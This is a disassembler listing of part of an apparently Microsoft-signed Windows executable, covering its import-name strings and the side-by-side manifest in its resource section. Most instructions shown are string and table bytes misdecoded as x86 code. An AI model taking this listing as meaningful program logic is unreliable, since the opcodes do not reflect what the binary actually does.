  408c2a:	sub    eax,0x322d316c
  408c2f:	sub    eax,0x6c642e31
  408c34:	ins    BYTE PTR es:[edi],dx
  408c35:	add    BYTE PTR [ecx+0x70],ah
  408c38:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  408c42:	outs   dx,DWORD PTR ds:[esi]
  408c43:	jb     0x408caa
  408c45:	sub    eax,0x6f727265
  408c4a:	jb     0x408cb4
  408c4c:	popa   
  408c4d:	outs   dx,BYTE PTR ds:[esi]
  408c4e:	fs ins BYTE PTR es:[edi],dx
  408c50:	imul   ebp,DWORD PTR [esi+0x67],0x2d316c2d
  408c57:	xor    DWORD PTR ds:0x6c642e31,ebp
  408c5d:	ins    BYTE PTR es:[edi],dx
  408c5e:	add    BYTE PTR [eax],al
  408c60:	dec    edi
  408c61:	dec    esp
  408c62:	inc    ebp
  408c63:	inc    ecx
  408c64:	push   ebp
  408c65:	push   esp
  408c66:	xor    esi,DWORD PTR [edx]
  408c68:	cs fs ins BYTE PTR es:[edi],dx
  408c6b:	ins    BYTE PTR es:[edi],dx
  408c6c:	add    BYTE PTR [eax],al
  408c6e:	popa   
  408c6f:	jo     0x408cda
  408c71:	sub    eax,0x772d736d
  408c76:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  408c7d:	sub    eax,0x69727473
  408c82:	outs   dx,BYTE PTR ds:[esi]
  408c83:	addr16 sub eax,0x312d326c
  408c89:	sub    eax,0x6c642e30
  408c8e:	ins    BYTE PTR es:[edi],dx
  408c8f:	add    BYTE PTR [ecx+0x70],ah
  408c92:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  408c9c:	outs   dx,DWORD PTR ds:[esi]
  408c9d:	jb     0x408d04
  408c9f:	sub    eax,0x70616568
  408ca4:	sub    eax,0x312d326c
  408ca9:	sub    eax,0x6c642e30
  408cae:	ins    BYTE PTR es:[edi],dx
  408caf:	add    BYTE PTR [ecx+0x70],ah
  408cb2:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  408cbc:	outs   dx,DWORD PTR ds:[esi]
  408cbd:	jb     0x408d24
  408cbf:	sub    eax,0x69737973
  408cc4:	outs   dx,BYTE PTR ds:[esi]
  408cc5:	outs   dx,WORD PTR ds:[esi]
  408cc7:	sub    eax,0x322d316c
  408ccc:	sub    eax,0x6c642e31
  408cd1:	ins    BYTE PTR es:[edi],dx
  408cd2:	add    BYTE PTR [eax],al
  408cd4:	popa   
  408cd5:	jo     0x408d40
  408cd7:	sub    eax,0x772d736d
  408cdc:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  408ce3:	sub    eax,0x636f7270
  408ce8:	gs jae 0x408d5e
  408ceb:	je     0x408d55
  408ced:	jb     0x408d54
  408cef:	popa   
  408cf0:	fs jae 0x408d20
  408cf3:	ins    BYTE PTR es:[edi],dx
  408cf4:	xor    DWORD PTR ds:0x2e322d31,ebp
  408cfa:	fs ins BYTE PTR es:[edi],dx
  408cfc:	ins    BYTE PTR es:[edi],dx
  408cfd:	add    BYTE PTR [ecx+0x70],ah
  408d00:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  408d0a:	outs   dx,DWORD PTR ds:[esi]
  408d0b:	jb     0x408d72
  408d0d:	sub    eax,0x666f7270
  408d12:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2d],0x312d316c
  408d1a:	sub    eax,0x6c642e30
  408d1f:	ins    BYTE PTR es:[edi],dx
  408d20:	add    BYTE PTR [eax],al
  408d22:	popa   
  408d23:	jo     0x408d8e
  408d25:	sub    eax,0x772d736d
  408d2a:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  408d31:	sub    eax,0x75626564
  408d36:	addr16 sub eax,0x312d316c
  408d3c:	sub    eax,0x6c642e31
  408d41:	ins    BYTE PTR es:[edi],dx
  408d42:	add    BYTE PTR [eax],al
  408d44:	add    eax,0x74736c00
  408d49:	jb     0x408dae
  408d4b:	ins    DWORD PTR es:[edi],dx
  408d4c:	jo     0x408db7
  408d4e:	push   edi
  408d4f:	add    BYTE PTR [eax],al
  408d51:	add    BYTE PTR [ebx+0x6f],al
  408d54:	ins    DWORD PTR es:[edi],dx
  408d55:	ins    DWORD PTR es:[edi],dx
  408d56:	popa   
  408d57:	outs   dx,BYTE PTR ds:[esi]
  408d58:	fs dec esp
  408d5a:	imul   ebp,DWORD PTR [esi+0x65],0x72416f54
  408d61:	addr16 jbe 0x408dbb
  408d64:	add    BYTE PTR [eax],al
  408d66:	popa   
  408d67:	jo     0x408dd2
  408d69:	sub    eax,0x772d736d
  408d6e:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  408d75:	sub    eax,0x69727473
  408d7a:	outs   dx,BYTE PTR ds:[esi]
  408d7b:	addr16 sub eax,0x6f73626f
  408d81:	ins    BYTE PTR es:[edi],dx
  408d82:	gs je  0x408dea
  408d85:	sub    eax,0x312d316c
  408d8a:	sub    eax,0x6c642e30
  408d8f:	ins    BYTE PTR es:[edi],dx
  408d90:	add    BYTE PTR [eax],al
  408d92:	popa   
  408d93:	jo     0x408dfe
  408d95:	sub    eax,0x772d736d
  408d9a:	imul   ebp,DWORD PTR [esi+0x2d],0x6f636873
  408da1:	jb     0x408e08
  408da3:	sub    eax,0x6f73626f
  408da8:	ins    BYTE PTR es:[edi],dx
  408da9:	gs je  0x408e11
  408dac:	sub    eax,0x312d316c
  408db1:	sub    eax,0x6c642e30
  408db6:	ins    BYTE PTR es:[edi],dx
  408db7:	add    BYTE PTR [edx+0x66654400],ah
  408dbd:	push   edi
  408dbe:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  408dc5:	outs   dx,DWORD PTR ds:[esi]
  408dc6:	arpl   WORD PTR [edi+0x0],dx
  408dc9:	add    BYTE PTR [ecx+0x67655202],ch
  408dcf:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  408dd6:	popa   
  408dd7:	jae    0x408e4c
  408dd9:	push   edi
  408dda:	add    BYTE PTR [eax],al
  408ddc:	pop    esp
  408ddd:	add    cl,BYTE PTR [ebp+0x65]
  408de0:	jae    0x408e55
  408de2:	popa   
  408de3:	addr16 gs inc edx
  408de6:	outs   dx,DWORD PTR ds:[esi]
  408de7:	js     0x408e40
  408de9:	add    BYTE PTR [edx],dh
  408deb:	add    cl,BYTE PTR [edi+ebp*2+0x61]
  408def:	fs dec ecx
  408df1:	arpl   WORD PTR [edi+0x6e],bp
  408df4:	push   edi
  408df5:	add    BYTE PTR [eax],dh
  408df7:	add    cl,BYTE PTR [edi+ebp*2+0x61]
  408dfb:	fs inc ebx
  408dfd:	jne    0x408e71
  408dff:	jae    0x408e70
  408e01:	jb     0x408e5a
  408e03:	add    BYTE PTR [esi+0x73654400],ch
  408e09:	je     0x408e7d
  408e0b:	outs   dx,DWORD PTR ds:[esi]
  408e0c:	jns    0x408e65
  408e0e:	imul   ebp,DWORD PTR [esi+0x64],0x7100776f
  408e15:	add    BYTE PTR [ebx+0x72],al
  408e18:	gs popa 
  408e1a:	je     0x408e81
  408e1c:	push   edi
  408e1d:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  408e24:	push   edi
  408e25:	add    BYTE PTR [ebp+0x53],dl
  408e28:	inc    ebp
  408e29:	push   edx
  408e2a:	xor    esi,DWORD PTR [edx]
  408e2c:	cs fs ins BYTE PTR es:[edi],dx
  408e2f:	ins    BYTE PTR es:[edi],dx
  408e30:	add    BYTE PTR [eax],al
  408e32:	add    al,BYTE PTR [eax]
  408e34:	inc    ebx
  408e35:	jb     0x408e9c
  408e37:	popa   
  408e38:	je     0x408e9f
  408e3a:	inc    ecx
  408e3b:	arpl   WORD PTR [ebx+eax*2+0x74],si
  408e3f:	js     0x408e98
  408e41:	add    BYTE PTR [eax],al
  408e43:	add    BYTE PTR [ecx+0x63],al
  408e46:	je     0x408eb1
  408e48:	jbe    0x408eab
  408e4a:	je     0x408eb1
  408e4c:	inc    ecx
  408e4d:	arpl   WORD PTR [ebx+eax*2+0x74],si
  408e51:	js     0x408e53
  408e53:	add    BYTE PTR [ebx],al
  408e55:	add    BYTE PTR [ebp+eiz*2+0x61],al
  408e59:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  408e5d:	popa   
  408e5e:	je     0x408ec5
  408e60:	inc    ecx
  408e61:	arpl   WORD PTR [ebx+eax*2+0x74],si
  408e65:	js     0x408e67
  408e67:	add    BYTE PTR [ecx],cl
  408e69:	add    BYTE PTR [edx+0x65],dl
  408e6c:	ins    BYTE PTR es:[edi],dx
  408e6d:	gs popa 
  408e6f:	jae    0x408ed6
  408e71:	inc    ecx
  408e72:	arpl   WORD PTR [ebx+eax*2+0x74],si
  408e76:	js     0x408e78
  408e78:	popa   
  408e79:	jo     0x408ee4
  408e7b:	sub    eax,0x772d736d
  408e80:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  408e87:	sub    eax,0x65646973
  408e8c:	bound  edi,QWORD PTR [ecx+0x73]
  408e8f:	imul   esp,DWORD PTR [ebp+eiz*2+0x2d],0x312d316c
  408e97:	sub    eax,0x6c642e30
  408e9c:	ins    BYTE PTR es:[edi],dx
  408e9d:	add    BYTE PTR [ecx+0x0],bh
  408ea0:	pop    edi
  408ea1:	pop    edi
  408ea2:	inc    ebx
  408ea3:	js     0x408f1d
  408ea5:	inc    esi
  408ea6:	jb     0x408f09
  408ea8:	ins    DWORD PTR es:[edi],dx
  408ea9:	gs dec eax
  408eab:	popa   
  408eac:	outs   dx,BYTE PTR ds:[esi]
  408ead:	fs ins BYTE PTR es:[edi],dx
  408eaf:	gs jb  0x408ee5
	...

Disassembly of section .rsrc:

00409000 <.rsrc>:
	...
  40900c:	add    DWORD PTR [eax],eax
  40900e:	add    al,0x0
  409010:	clc    
  409011:	add    al,BYTE PTR [eax]
  409013:	cmp    BYTE PTR [eax],0x0
  409016:	add    BYTE PTR [eax+0x3],al
  40901c:	push   eax
  40901d:	add    BYTE PTR [eax],al
  40901f:	or     BYTE PTR [esi],0x0
  409022:	add    BYTE PTR [eax],al
  409024:	test   al,0x0
  409026:	add    BYTE PTR [eax+0x10],al
  40902c:	rol    BYTE PTR [eax],0x0
  40902f:	sbb    BYTE PTR [eax],0x0
  409032:	add    BYTE PTR [eax],al
  409034:	fadd   DWORD PTR [eax]
  409036:	add    BYTE PTR [eax+0x0],al
	...
  409044:	add    BYTE PTR [eax],al
  409046:	add    DWORD PTR [eax],eax
  409048:	add    DWORD PTR [eax],eax
  40904a:	add    BYTE PTR [eax],al
  40904c:	lock add BYTE PTR [eax],al
  40904f:	add    BYTE PTR [eax],0x0
	...
  40905e:	or     DWORD PTR [eax],eax
  409060:	add    DWORD PTR [eax],eax
  409062:	add    BYTE PTR [eax],al
  409064:	or     BYTE PTR [ecx],al
  409066:	add    BYTE PTR [eax+0x2],al
  40906c:	and    BYTE PTR [ecx],al
  40906e:	add    BYTE PTR [eax+0x3],al
  409074:	cmp    BYTE PTR [ecx],al
  409076:	add    BYTE PTR [eax+0x4],al
  40907c:	push   eax
  40907d:	add    DWORD PTR [eax],eax
  40907f:	add    BYTE PTR ds:0x68000000,0x1
  409086:	add    BYTE PTR [eax+0x6],al
  40908c:	add    BYTE PTR [ecx],0x0
  40908f:	add    BYTE PTR [edi],0x0
  409092:	add    BYTE PTR [eax],al
  409094:	cwde   
  409095:	add    DWORD PTR [eax],eax
  409097:	or     BYTE PTR [eax],0x0
  40909a:	add    BYTE PTR [eax],al
  40909c:	mov    al,0x1
  40909e:	add    BYTE PTR [eax+0x9],al
  4090a4:	enter  0x1,0x80
	...
  4090b4:	add    BYTE PTR [eax],al
  4090b6:	add    DWORD PTR [eax],eax
  4090b8:	adc    BYTE PTR [edi],ah
  4090ba:	add    BYTE PTR [eax],al
  4090bc:	loopne 0x4090bf
  4090be:	add    BYTE PTR [eax+0x0],al
	...
  4090cc:	add    BYTE PTR [eax],al
  4090ce:	add    DWORD PTR [eax],eax
  4090d0:	add    DWORD PTR [eax],eax
  4090d2:	add    BYTE PTR [eax],al
  4090d4:	clc    
  4090d5:	add    DWORD PTR [eax],eax
  4090d7:	add    BYTE PTR [eax],0x0
	...
  4090e6:	add    DWORD PTR [eax],eax
  4090e8:	add    DWORD PTR [eax],eax
  4090ea:	add    BYTE PTR [eax],al
  4090ec:	adc    BYTE PTR [edx],al
  4090ee:	add    BYTE PTR [eax+0x0],al
	...
  4090fc:	add    BYTE PTR [eax],al
  4090fe:	add    DWORD PTR [eax],eax
  409100:	or     DWORD PTR [eax+eax*1],eax
  409103:	add    BYTE PTR [eax],ch
  409105:	add    al,BYTE PTR [eax]
	...
  409113:	add    BYTE PTR [eax],al
  409115:	add    BYTE PTR [ecx],al
  409117:	add    BYTE PTR [ecx],cl
  409119:	add    al,0x0
  40911b:	add    BYTE PTR [eax],bh
  40911d:	add    al,BYTE PTR [eax]
	...
  40912b:	add    BYTE PTR [eax],al
  40912d:	add    BYTE PTR [ecx],al
  40912f:	add    BYTE PTR [ecx],cl
  409131:	add    al,0x0
  409133:	add    BYTE PTR [eax+0x2],cl
	...
  409146:	add    DWORD PTR [eax],eax
  409148:	or     DWORD PTR [eax+eax*1],eax
  40914b:	add    BYTE PTR [eax+0x2],bl
	...
  40915e:	add    DWORD PTR [eax],eax
  409160:	or     DWORD PTR [eax+eax*1],eax
  409163:	add    BYTE PTR [eax+0x2],ch
	...
  409176:	add    DWORD PTR [eax],eax
  409178:	or     DWORD PTR [eax+eax*1],eax
  40917b:	add    BYTE PTR [eax+0x2],bh
	...
  40918e:	add    DWORD PTR [eax],eax
  409190:	or     DWORD PTR [eax+eax*1],eax
  409193:	add    BYTE PTR [eax+0x2],cl
	...
  4091a5:	add    BYTE PTR [ecx],al
  4091a7:	add    BYTE PTR [ecx],cl
  4091a9:	add    al,0x0
  4091ab:	add    BYTE PTR [eax+0x2],bl
	...
  4091bd:	add    BYTE PTR [ecx],al
  4091bf:	add    BYTE PTR [ecx],cl
  4091c1:	add    al,0x0
  4091c3:	add    BYTE PTR [eax+0x2],ch
	...
  4091d5:	add    BYTE PTR [ecx],al
  4091d7:	add    BYTE PTR [ecx],cl
  4091d9:	add    al,0x0
  4091db:	add    BYTE PTR [eax+0x2],bh
	...
  4091ed:	add    BYTE PTR [ecx],al
  4091ef:	add    BYTE PTR [ecx],cl
  4091f1:	add    al,0x0
  4091f3:	add    al,cl
  4091f5:	add    al,BYTE PTR [eax]
	...
  409203:	add    BYTE PTR [eax],al
  409205:	add    BYTE PTR [ecx],al
  409207:	add    BYTE PTR [ecx],cl
  409209:	add    al,0x0
  40920b:	add    al,bl
  40920d:	add    al,BYTE PTR [eax]
	...
  40921b:	add    BYTE PTR [eax],al
  40921d:	add    BYTE PTR [ecx],al
  40921f:	add    BYTE PTR [ecx],cl
  409221:	add    al,0x0
  409223:	add    al,ch
  409225:	add    al,BYTE PTR [eax]
  409227:	add    al,cl
  409229:	std    
  40922a:	add    BYTE PTR [eax],al
  40922c:	rol    BYTE PTR [eax],1
	...
  409236:	add    BYTE PTR [eax],al
  409238:	pop    eax
  409239:	fwait
  40923a:	add    BYTE PTR [eax],al
  40923c:	push   0x6
  409241:	add    BYTE PTR [eax],al
  409243:	add    BYTE PTR [eax],al
  409245:	add    BYTE PTR [eax],al
  409247:	add    al,al
  409249:	mov    eax,ds:0x2e80000
	...
  409256:	add    BYTE PTR [eax],al
  409258:	test   al,0xa4
  40925a:	add    BYTE PTR [eax],al
  40925c:	sub    BYTE PTR [ecx],al
	...
  409266:	add    BYTE PTR [eax],al
  409268:	shl    BYTE PTR [ebp+0xea80000],1
	...
  409276:	add    BYTE PTR [eax],al
  409278:	js     0x40922e
  40927a:	add    BYTE PTR [eax],al
  40927c:	test   al,0x8
	...
  409286:	add    BYTE PTR [eax],al
  409288:	and    BYTE PTR [ebp+0x5680000],bh
	...
  409296:	add    BYTE PTR [eax],al
  409298:	mov    dl,al
  40929a:	add    BYTE PTR [eax],al
  40929c:	test   al,0x25
	...
  4092a6:	add    BYTE PTR [eax],al
  4092a8:	xor    al,ch
  4092aa:	add    BYTE PTR [eax],al
  4092ac:	test   al,0x10
	...
  4092b6:	add    BYTE PTR [eax],al
  4092b8:	fdivr  st,st(0)
  4092ba:	add    BYTE PTR [eax],al
  4092bc:	push   0x4
  4092c1:	add    BYTE PTR [eax],al
  4092c3:	add    BYTE PTR [eax],al
  4092c5:	add    BYTE PTR [eax],al
  4092c7:	add    BYTE PTR [eax-0x3],al
  4092ca:	add    BYTE PTR [eax],al
  4092cc:	test   BYTE PTR [eax],al
	...
  4092d6:	add    BYTE PTR [eax],al
  4092d8:	mov    al,0x97
  4092da:	add    BYTE PTR [eax],al
  4092dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092dd:	add    eax,DWORD PTR [eax]
	...
  4092e7:	add    BYTE PTR [eax],al
  4092e9:	xchg   ebx,eax
  4092ea:	add    BYTE PTR [eax],al
  4092ec:	test   eax,0x4
  4092f1:	add    BYTE PTR [eax],al
  4092f3:	add    BYTE PTR [eax],al
  4092f5:	add    BYTE PTR [eax],al
  4092f7:	add    BYTE PTR [ebx],al
  4092f9:	add    BYTE PTR [ebp+0x0],cl
  4092fc:	push   ebp
  4092fd:	add    BYTE PTR [ecx+0x0],cl
  409300:	cmp    al,0x3f
  409302:	js     0x409371
  409304:	ins    BYTE PTR es:[edi],dx
  409305:	and    BYTE PTR [esi+0x65],dh
  409308:	jb     0x40937d
  40930a:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  409311:	xor    BYTE PTR [edx],ah
  409313:	and    BYTE PTR [ebp+0x6e],ah
  409316:	arpl   WORD PTR [edi+0x64],bp
  409319:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  409320:	inc    esi
  409321:	sub    eax,0x73202238
  409326:	je     0x409389
  409328:	outs   dx,BYTE PTR ds:[esi]
  409329:	fs popa 
  40932b:	ins    BYTE PTR es:[edi],dx
  40932c:	outs   dx,DWORD PTR ds:[esi]
  40932d:	outs   dx,BYTE PTR ds:[esi]
  40932e:	gs cmp eax,0x73657922
  409334:	and    bh,BYTE PTR [edi]
  409336:	ds or  eax,0x2d213c0a
  40933c:	sub    eax,0x706f4320
  409341:	jns    0x4093b5
  409343:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  40934a:	sub    DWORD PTR [eax],esp
  40934c:	dec    ebp
  40934d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  409354:	je     0x409376
  409356:	inc    ebx
  409357:	outs   dx,DWORD PTR ds:[esi]
  409358:	jb     0x4093ca
  40935a:	outs   dx,DWORD PTR ds:[esi]
  40935b:	jb     0x4093be
  40935d:	je     0x4093c8
  40935f:	outs   dx,DWORD PTR ds:[esi]
  409360:	outs   dx,BYTE PTR ds:[esi]
  409361:	and    BYTE PTR ds:0xa0d3e2d,ch
  409367:	cmp    al,0x61
  409369:	jae    0x4093de
  40936b:	gs ins DWORD PTR es:[edi],dx
  40936d:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  409371:	js     0x4093e0
  409373:	ins    BYTE PTR es:[edi],dx
  409374:	outs   dx,BYTE PTR ds:[esi]
  409375:	jae    0x4093b4
  409377:	and    dh,BYTE PTR [ebp+0x72]
  40937a:	outs   dx,BYTE PTR ds:[esi]
  40937b:	cmp    dh,BYTE PTR [ebx+0x63]
  40937e:	push   0x73616d65
  409383:	sub    eax,0x7263696d
  409388:	outs   dx,DWORD PTR ds:[esi]
  409389:	jae    0x4093fa
  40938b:	data16 je 0x4093bb
  40938e:	arpl   WORD PTR [edi+0x6d],bp
  409391:	cmp    ah,BYTE PTR [ecx+0x73]
  409394:	ins    DWORD PTR es:[edi],dx
  409395:	cs jbe 0x4093c9
  409398:	and    ah,BYTE PTR [eax]
  40939a:	ins    DWORD PTR es:[edi],dx
  40939b:	popa   
  40939c:	outs   dx,BYTE PTR ds:[esi]
  40939d:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  4093a4:	jb     0x409419
  4093a6:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4093ad:	xor    BYTE PTR [edx],ah
  4093af:	ds or  eax,0x200a0d0a
  4093b5:	and    BYTE PTR [ecx+eiz*2],bh
  4093b8:	jae    0x40942d
  4093ba:	gs ins DWORD PTR es:[edi],dx
  4093bc:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4093c0:	fs outs dx,BYTE PTR gs:[esi]
  4093c3:	je     0x40942e
  4093c5:	je     0x409440
  4093c7:	and    BYTE PTR ds:0x2020200a,cl
  4093cd:	and    BYTE PTR [eax],ah
  4093cf:	jbe    0x409436
  4093d1:	jb     0x409446
  4093d3:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4093da:	xor    BYTE PTR [esi],ch
  4093dc:	xor    BYTE PTR [esi],ch
  4093de:	xor    BYTE PTR [edx],ah
  4093e0:	or     eax,0x2020200a
  4093e5:	and    BYTE PTR [eax],ah
  4093e7:	jo     0x40945b
  4093e9:	outs   dx,DWORD PTR ds:[esi]
  4093ea:	arpl   WORD PTR [ebp+0x73],sp
  4093ed:	jae    0x40945e
  4093ef:	jb     0x409432
  4093f1:	jb     0x409456
  4093f3:	push   0x63657469
  4093f8:	je     0x40946f
  4093fa:	jb     0x409461
  4093fc:	cmp    eax,0x36387822
  409401:	and    cl,BYTE PTR ds:0x2020200a
  409407:	and    BYTE PTR [eax],ah
  409409:	outs   dx,BYTE PTR ds:[esi]
  40940a:	popa   
  40940b:	ins    DWORD PTR es:[edi],dx
  40940c:	gs cmp eax,0x63694d22
  409412:	jb     0x409483
  409414:	jae    0x409485
  409416:	data16 je 0x409447
  409419:	push   edi
  40941a:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  409421:	dec    esi
  409422:	gs je  0x409453
  409425:	pop    eax
  409426:	push   edi
  409427:	dec    ecx
  409428:	pop    edx
  409429:	inc    ecx
  40942a:	push   edx
  40942b:	inc    esp
  40942c:	and    cl,BYTE PTR ds:0x2020200a
  409432:	and    BYTE PTR [eax],ah
  409434:	je     0x4094af
  409436:	jo     0x40949d
  409438:	cmp    eax,0x6e697722
  40943d:	xor    esi,DWORD PTR [edx]
  40943f:	and    cl,BYTE PTR ds:0x2f20200a
  409445:	ds or  eax,0x200a0d0a
  40944b:	and    BYTE PTR [esp+eiz*2],bh
  40944e:	gs jae 0x4094b4
  409451:	jb     0x4094bc
  409453:	jo     0x4094c9
  409455:	imul   ebp,DWORD PTR [edi+0x6e],0x63694d3e
  40945c:	jb     0x4094cd
  40945e:	jae    0x4094cf
  409460:	data16 je 0x409490
  409463:	push   edi
  409464:	imul   ebp,DWORD PTR [esi+0x64],0x2d73776f
  40946b:	pop    eax
  40946c:	push   edi
  40946d:	imul   edi,DWORD PTR [edx+0x61],0x2d736472
  409474:	dec    eax
  409475:	outs   dx,DWORD PTR ds:[esi]
  409476:	jae    0x4094ec
  409478:	sub    eax,0x636f7250
  40947d:	gs jae 0x4094f3
  409480:	cmp    al,0x2f
  409482:	fs gs jae 0x4094e9
  409486:	jb     0x4094f1
  409488:	jo     0x4094fe
  40948a:	imul   ebp,DWORD PTR [edi+0x6e],0xd0a0d3e
  409491:	or     ah,BYTE PTR [eax]
  409493:	and    BYTE PTR [esp+eiz*2],bh
  409496:	gs jo  0x4094fe
  409499:	outs   dx,BYTE PTR ds:[esi]
  40949a:	fs outs dx,BYTE PTR gs:[esi]
  40949d:	arpl   WORD PTR [ecx+0x3e],di
  4094a0:	or     eax,0x2020200a
  4094a5:	and    BYTE PTR [esp+eiz*2],bh
  4094a8:	gs jo  0x409510
  4094ab:	outs   dx,BYTE PTR ds:[esi]
  4094ac:	fs outs dx,BYTE PTR gs:[esi]
  4094af:	je     0x4094f2
  4094b1:	jae    0x409526
  4094b3:	gs ins DWORD PTR es:[edi],dx
  4094b5:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  4094b9:	or     eax,0x2020200a
  4094be:	and    BYTE PTR [eax],ah
  4094c0:	and    BYTE PTR [eax],ah
  4094c2:	and    BYTE PTR [eax],ah
  4094c4:	cmp    al,0x61
  4094c6:	jae    0x40953b
  4094c8:	gs ins DWORD PTR es:[edi],dx
  4094ca:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4094ce:	fs outs dx,BYTE PTR gs:[esi]
  4094d1:	je     0x40953c
  4094d3:	je     0x40954e
  4094d5:	or     eax,0x2020200a
  4094da:	and    BYTE PTR [eax],ah
  4094dc:	and    BYTE PTR [eax],ah
  4094de:	and    BYTE PTR [eax],ah
  4094e0:	and    BYTE PTR [eax],ah
  4094e2:	and    BYTE PTR [eax],ah
  4094e4:	je     0x40955f
  4094e6:	jo     0x40954d
  4094e8:	cmp    eax,0x6e697722
  4094ed:	xor    esi,DWORD PTR [edx]
  4094ef:	and    cl,BYTE PTR ds:0x2020200a
  4094f5:	and    BYTE PTR [eax],ah
  4094f7:	and    BYTE PTR [eax],ah
  4094f9:	and    BYTE PTR [eax],ah
  4094fb:	and    BYTE PTR [eax],ah
  4094fd:	and    BYTE PTR [eax],ah
  4094ff:	outs   dx,BYTE PTR ds:[esi]
  409500:	popa   
  409501:	ins    DWORD PTR es:[edi],dx
  409502:	gs cmp eax,0x63694d22
  409508:	jb     0x409579
  40950a:	jae    0x40957b
  40950c:	data16 je 0x40953d
  40950f:	push   edi
  409510:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  409517:	inc    ebx
  409518:	outs   dx,DWORD PTR ds:[esi]
  409519:	ins    DWORD PTR es:[edi],dx
  40951a:	ins    DWORD PTR es:[edi],dx
  40951b:	outs   dx,DWORD PTR ds:[esi]
  40951c:	outs   dx,BYTE PTR ds:[esi]
  40951d:	sub    eax,0x746e6f43
  409522:	jb     0x409593
  409524:	ins    BYTE PTR es:[edi],dx
  409525:	jae    0x409549
  409527:	or     eax,0x2020200a
  40952c:	and    BYTE PTR [eax],ah
  40952e:	and    BYTE PTR [eax],ah
  409530:	and    BYTE PTR [eax],ah
  409532:	and    BYTE PTR [eax],ah
  409534:	and    BYTE PTR [eax],ah
  409536:	jbe    0x40959d
  409538:	jb     0x4095ad
  40953a:	imul   ebp,DWORD PTR [edi+0x6e],0x2e36223d
  409541:	xor    BYTE PTR [esi],ch
  409543:	xor    BYTE PTR [esi],ch
  409545:	xor    BYTE PTR [edx],ah
  409547:	or     eax,0x2020200a
  40954c:	and    BYTE PTR [eax],ah
  40954e:	and    BYTE PTR [eax],ah
  409550:	and    BYTE PTR [eax],ah
  409552:	and    BYTE PTR [eax],ah
  409554:	and    BYTE PTR [eax],ah
  409556:	jo     0x4095ca
  409558:	outs   dx,DWORD PTR ds:[esi]
  409559:	arpl   WORD PTR [ebp+0x73],sp
  40955c:	jae    0x4095cd
  40955e:	jb     0x4095a1
  409560:	jb     0x4095c5
  409562:	push   0x63657469
  409567:	je     0x4095de
  409569:	jb     0x4095d0
  40956b:	cmp    eax,0xd222a22
  409570:	or     ah,BYTE PTR [eax]
  409572:	and    BYTE PTR [eax],ah
  409574:	and    BYTE PTR [eax],ah
  409576:	and    BYTE PTR [eax],ah
  409578:	and    BYTE PTR [eax],ah
  40957a:	and    BYTE PTR [eax],ah
  40957c:	and    BYTE PTR [eax],ah
  40957e:	jo     0x4095f5
  409580:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  409584:	dec    ebx
  409585:	gs jns 0x4095dc
  409588:	outs   dx,DWORD PTR ds:[esi]
  409589:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  40958d:	and    dh,BYTE PTR [esi]
  40958f:	xor    eax,0x36623539
  409594:	xor    al,0x31
  409596:	xor    al,0x34
  409598:	arpl   WORD PTR [ebx+0x66],sp
  40959b:	xor    DWORD PTR [esi+eiz*2+0x22],esp
  40959f:	or     eax,0x2020200a
  4095a4:	and    BYTE PTR [eax],ah
  4095a6:	and    BYTE PTR [eax],ah
  4095a8:	and    BYTE PTR [eax],ah
  4095aa:	and    BYTE PTR [eax],ah
  4095ac:	and    BYTE PTR [eax],ah
  4095ae:	ins    BYTE PTR es:[edi],dx
  4095af:	popa   
  4095b0:	outs   dx,BYTE PTR ds:[esi]
  4095b1:	addr16 jne 0x409615
  4095b4:	addr16 gs cmp eax,0xd222a22
  4095bb:	or     ah,BYTE PTR [eax]
  4095bd:	and    BYTE PTR [eax],ah
  4095bf:	and    BYTE PTR [eax],ah
  4095c1:	and    BYTE PTR [eax],ah
  4095c3:	and    BYTE PTR [edi],ch
  4095c5:	ds or  eax,0x2020200a
  4095cb:	and    BYTE PTR [edi+ebp*1],bh
  4095ce:	fs gs jo 0x409637
  4095d2:	outs   dx,BYTE PTR ds:[esi]
  4095d3:	fs outs dx,BYTE PTR gs:[esi]
  4095d6:	je     0x409619
  4095d8:	jae    0x40964d
  4095da:	gs ins DWORD PTR es:[edi],dx
  4095dc:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  4095e0:	or     eax,0x3c20200a
  4095e5:	das    
  4095e6:	fs gs jo 0x40964f
  4095ea:	outs   dx,BYTE PTR ds:[esi]
  4095eb:	fs outs dx,BYTE PTR gs:[esi]
  4095ee:	arpl   WORD PTR [ecx+0x3e],di
  4095f1:	or     eax,0x200a0d0a
  4095f6:	and    BYTE PTR [ecx+eiz*2],bh
  4095f9:	jae    0x409668
  4095fb:	jbe    0x409630
  4095fd:	cmp    ah,BYTE PTR [ecx+0x70]
  409600:	jo     0x40966e
  409602:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  409609:	ds or  eax,0x2020200a
  40960f:	and    BYTE PTR [ecx+eiz*2],bh
  409612:	jae    0x409681
  409614:	jbe    0x409649
  409616:	cmp    dh,BYTE PTR [edi+0x69]
